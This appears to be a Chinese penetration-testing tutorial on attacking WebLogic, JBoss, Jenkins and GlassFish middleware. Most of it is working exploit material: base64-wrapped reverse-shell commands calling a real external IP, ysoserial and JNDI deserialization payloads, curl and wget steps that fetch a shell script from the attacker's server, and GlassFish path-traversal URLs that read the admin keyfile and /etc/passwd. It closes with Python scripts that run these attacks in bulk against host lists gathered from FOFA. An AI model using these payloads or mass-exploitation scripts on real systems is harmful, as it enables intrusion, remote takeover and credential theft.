![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134627442-940950795.png)

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134631417-1438771459.png)

```plain
#知识点：
中间件及框架列表：
IIS，Apache，Nginx，Tomcat，Docker，Weblogic，JBoos，WebSphere，Jenkins ，GlassFish，Jira，Struts2，Laravel，Solr，Shiro，Thinkphp，Spring，Flask，jQuery等
1、中间件-Weblogic安全
2、中间件-JBoos安全
2、中间件-Jenkins安全
3、中间件-GlassFish安全

#章节内容：
常见中间件的安全测试：
1、配置不当-解析&弱口令
2、安全机制-特定安全漏洞
3、安全机制-弱口令爆破攻击
4、安全应用-框架特定安全漏洞

#前置知识：
中间件安全测试流程：
1、判断中间件信息-名称&版本&三方
2、判断中间件问题-配置不当&公开漏洞
3、判断中间件利用-弱口令&EXP&框架漏洞

应用服务安全测试流程：见图
1、判断服务开放情况-端口扫描&组合应用等
2、判断服务类型归属-数据库&文件传输&通讯等
3、判断服务利用方式-特定漏洞&未授权&弱口令等
```

- 中间件-Weblogic-工具搜哈

```plain
探针默认端口：7001，Weblogic是Oracle公司推出的J2EE应用服务器

1.cve_2017_3506   工具
https://blog.csdn.net/YouthBelief/article/details/121090668

2.cve_2018_2893   工具
https://www.jianshu.com/p/7a1b194e9285

3.cve_2018_3245   工具
https://www.csdn.net/tags/OtDaUgysOTEyNTItYmxvZwO0O0OO0O0O.html

4.cve_2020_14882  工具
https://www.cnblogs.com/0justin0/p/16034094.html

启动环境：http://vulfocus.io/#/dashboard
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134648209-1784527411.png)

```plain
把地址复制上去就可以直接检测出来。
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134647684-230631485.png)

```plain
5.cve_2021_2394   反序列化（需要手工演示）

利用到的工具：
https://github.com/lz2y/CVE-2021-2394
https://github.com/welk1n/JNDI-Injection-Exploit

先对反弹shell进行编码：bash -i >& /dev/tcp/175.178.151.29/5566 0>&1
经过base64编码：YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzUuMTc4LjE1MS4yOS81NTY2IDA+JjE=（为什么要进行编码，这个是和漏洞相关的。）
上传文件（NDI-Injection-Exploit-1.0-SNAPSHOT-all.jar）到服务器，执行：java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzUuMTc4LjE1MS4yOS81NTY2IDA+JjE=}|{base64,-d}|{bash,-i}" -A 175.178.151.29
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134648147-768952613.png)

```plain
复制地址：ldap://175.178.151.29:1389/2bvnem

在本地执行：java -jar CVE_2021_2394.jar 123.58.236.76 32307 ldap://175.178.151.29:1389/2bvnem

监听5566端口
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134648677-103936778.png)

```plain
出现版本问题，但是试了很多版本都是一样的。
```

- 中间件-JBoos-工具脚本搜哈

```plain
Jboss通常占用的端口是1098，1099，4444，4445，8080，8009，8083，8093这几个，Red Hat JBoss Application Server 是一款基于JavaEE的开源应用服务器。

1、CVE-2017-12149
启动环境：
cd /vulhub-master/jboss/CVE-2017-12149
sudo docker-compose up -d

访问：http://192.168.233.128:8080/
利用工具：ysoserial-master-30099844c6-1.jar

利用过程：
先对反弹shell进行编码：bash -i >& /dev/tcp/175.178.151.29/5566 0>&1
经过base64编码：YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzUuMTc4LjE1MS4yOS81NTY2IDA+JjE=
生成：java -jar ysoserial-master-30099844c6-1.jar CommonsCollections5 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzUuMTc4LjE1MS4yOS81NTY2IDA+JjE=}|{base64,-d}|{bash,-i}" > poc.ser
生成poc.ser文件
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134647924-417960915.png)

```plain
在用crul请求，把这个包发送出去：G:\cmd\nc-lcx-curl\curl.exe http://192.168.233.128:8080/invoker/readonly --data-binary @poc.ser
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134648494-1504975389.png)

```plain
2、CVE-2017-7504

启动环境：
cd /vulhub-master/jboss/CVE-2017-7504
sudo docker-compose up -d

访问：http://192.168.233.128:8080/
利用工具：ysoserial-master-30099844c6-1.jar

利用过程：
先对反弹shell进行编码：bash -i >& /dev/tcp/175.178.151.29/5566 0>&1
经过base64编码：YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzUuMTc4LjE1MS4yOS81NTY2IDA+JjE=
生成：java -jar ysoserial-master-30099844c6-1.jar CommonsCollections5 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzUuMTc4LjE1MS4yOS81NTY2IDA+JjE=}|{base64,-d}|{bash,-i}" > 1.ser
利用crul去发送数据包：G:\cmd\nc-lcx-curl\curl.exe http://192.168.233.128:8080/jbossmq-httpil/HTTPServerILServlet --data-binary @1.ser
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134648410-997260203.png)

```plain
3、弱口令 未授权访问见手册
语法："JBoss" && title=="Welcome to JBoss&trade;"
```

- 中间件-Jenkins-工具脚本搜哈

```plain
探针默认端口：8080，Jenkins是一个开源软件项目，是基于Java开发的一种持续集成工具，用于监控持续重复的工作。

1、cve_2017_1000353 需要用到JDK-1.8.0_291 其他版本失效
项目地址：http://github.com/vulhub/CVE-2017-1000353
环境：http://vulfocus.io/#/dashboard

利用过程：
先对反弹shell进行编码：bash -i >& /dev/tcp/175.178.151.29/5566 0>&1
经过base64编码：YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzUuMTc4LjE1MS4yOS81NTY2IDA+JjE=
生成jenkins_poc.ser文件（需要用JDK-1.8.0_291版本）：G:\jdk-8u291\bin\java.exe -jar CVE-2017-1000353-1.1-SNAPSHOT-all.jar jenkins_poc.ser "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzUuMTc4LjE1MS4yOS81NTY2IDA+JjE=}|{base64,-d}|{bash,-i}"
在利用python3去运行请求：G:\python38\python.exe exploit.py http://123.58.236.76:27904/ jenkins_poc.ser
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134648876-1834126985.png)

```plain
2、CVE-2018-1000861
利用工具：https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc
环境：http://vulfocus.io/#/dashboard


直接利用不能成功，需要换一种思路才可以成功。先一个反弹shell的命令在txt文本，然后执行命令去下载这个文件，然后执行这个文件就可以完成shell反弹。

在shell.txt中写上代码：bash -i >& /dev/tcp/175.178.151.29/5566 0>&1
启动服务器：python3 -m http.server 3333
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134648216-1770103445.png)

```plain
下载文件：python2 exp.py http://123.58.236.76:57339/ "curl -o /tmp/1.sh http://175.178.151.29:3333/shell.txt" 
python2 exp.py http://123.58.236.76:57339/ "wget http://175.178.151.29:3333/shell.txt -O /tmp/1.sh"  （但是这个在监听中没有检测到）
执行文件：python2 exp.py http://123.58.236.76:57339/ "bash /tmp/1.sh"
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134648132-1192868529.png)

```plain
3、cve_2019_1003000 需要用户帐号密码
参考：https://blog.csdn.net/xuandao_ahfengren/article/details/108768357
```

- 中间件-GlassFish-工具脚本搜哈

```plain
探针默认端口：4848，GlassFish 是一款强健的商业兼容应用服务器

1.简单口令，访问特定地址就可以了。
2.CVE-2017-1000028
直接访问特定地址就可以完成。
读密码：/theme/META-INF/%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./domains/domain1/config/admin-keyfile
读windows文件：/theme/META-INF/prototype%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini
读linux文件：/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134648268-1155254431.png)

- 配合下-FofaViewer-工具脚本搜哈

```plain
1、配合GlassFish读取测试
语法："glassfish" && port="4848" && protocol="http"
写py脚本去测试
import time

import requests


for url in open('url.txt'):
    url=url.strip()
    print(url)
    p_url='http://'+url+':4848/theme/META-INF/%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./domains/domain1/config/admin-keyfile'
    w_url='http://'+url+':4848/theme/META-INF/prototype%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini'
    l_url='http://'+url+':4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd'
    
    try:
        p_code = requests.get(p_url).status_code
        w_code=requests.get(w_url).status_code
        l_code = requests.get(l_url).status_code
        if l_code == 200:
            print(l_url+'->|ok')
        elif w_code == 200:
            print(w_url+'->|ok')
        elif p_code == 200:
            print(p_url+'->|ok')
    except Exception as e:
        #print(e)
        time.sleep(0.01)

2、配合Jenkins-CVE-2018-1000861
语法：app=“jenkins”

import os

for ip in open('ips.txt'):
    ip=ip.strip()
    cmdline='python2 exp.py http://%s/ "curl -o /tmp/1.sh http://175.178.151.29:3333/shell.txt"'%ip
    print(cmdline)
    os.system(cmdline)
```

